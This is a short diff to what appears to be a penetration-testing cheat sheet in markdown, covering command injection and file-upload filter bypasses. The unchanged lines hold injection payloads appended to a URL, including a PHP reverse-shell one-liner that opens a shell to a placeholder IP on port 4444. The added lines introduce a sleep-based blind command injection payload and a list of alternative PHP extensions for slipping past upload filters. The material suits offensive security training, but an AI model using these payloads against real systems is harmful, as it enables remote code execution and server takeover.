@@ -997,6 +997,8 @@ https://tcm-sec.com; whoami; #
 https://tcm-sec.com; which php; #
 https://tcm-com.com; php -r '$sock=fsockopen("eth0.ip.add.ress",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; #
 ```
+
+**Blind Command Injection**
 ```bash
 http://localhost?q=`sleep 10`
 ```
@@ -1038,6 +1040,11 @@ filename.php%00.png
 **Bypass with multiple extension**
 ```bash
 filename.php.png
+```
+
+**Bypass with alternative extension**
+```bash
+.php -> phtml, php5, php2, php3, php4, php....
 ```
 
 **Bypass with magic byte**
